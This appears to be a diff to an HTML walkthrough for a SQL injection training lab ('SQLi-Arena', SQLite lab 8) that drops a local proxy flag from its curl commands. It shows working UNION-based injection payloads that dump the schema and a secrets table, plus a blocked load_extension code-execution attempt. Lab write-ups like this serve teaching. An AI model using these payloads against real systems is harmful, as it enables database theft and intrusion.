@@ -9,7 +9,7 @@
         <span class="terminal-title">Step 1. Normal Search</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=Q1"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=Q1"<br>
         <span class="prompt">SQL: </span>SELECT id, report_name, status FROM reports WHERE report_name LIKE '%Q1%'<br><br>
         <span class="prompt">Output:</span><br>
         id | report_name | status<br>
@@ -26,7 +26,7 @@
         <span class="terminal-title">Step 2. Error Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report='"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report='"<br>
         <span class="prompt">Error: </span><strong>SQLite Error: unrecognized token: "&#039;"</strong>
     </div>
 </div>
@@ -40,7 +40,7 @@
         <span class="terminal-title">Step 3. Table Discovery</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT name, sql, type FROM sqlite_master -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT name, sql, type FROM sqlite_master -- -"<br><br>
         <span class="prompt">Output:</span><br>
         id | report_name | status<br>
         1 | Q1 Financial Report | published<br>
@@ -64,7 +64,7 @@
         <span class="terminal-title">Step 4. Flag Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT id, secret_value, 'pwned' FROM master_secrets -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT id, secret_value, 'pwned' FROM master_secrets -- -"<br><br>
         <span class="prompt">Output:</span><br>
         id | report_name | status<br>
         1 | <strong>FLAG{sq_l04d_3xt_rc3}</strong> | pwned<br>
@@ -89,7 +89,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT id, secret_value, 'pwned' FROM master_secrets -- -"
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT id, secret_value, 'pwned' FROM master_secrets -- -"
     </div>
 </div>
 
@@ -104,7 +104,7 @@
         <span class="terminal-title">Step 6: load_extension Attempt</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT 1, load_extension('/tmp/evil.so'), 3 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab8" \<br> --data-urlencode "report=' UNION SELECT 1, load_extension('/tmp/evil.so'), 3 -- -"<br>
         <span class="prompt">Error: </span><strong>SQLite Error: not authorized</strong><br><br>
         <span class="prompt">// load_extension() is disabled by default in PHP's SQLite3 class.</span><br>
         <span class="prompt">// It must be explicitly enabled with $conn-&gt;enableLoadExtension(true)</span>
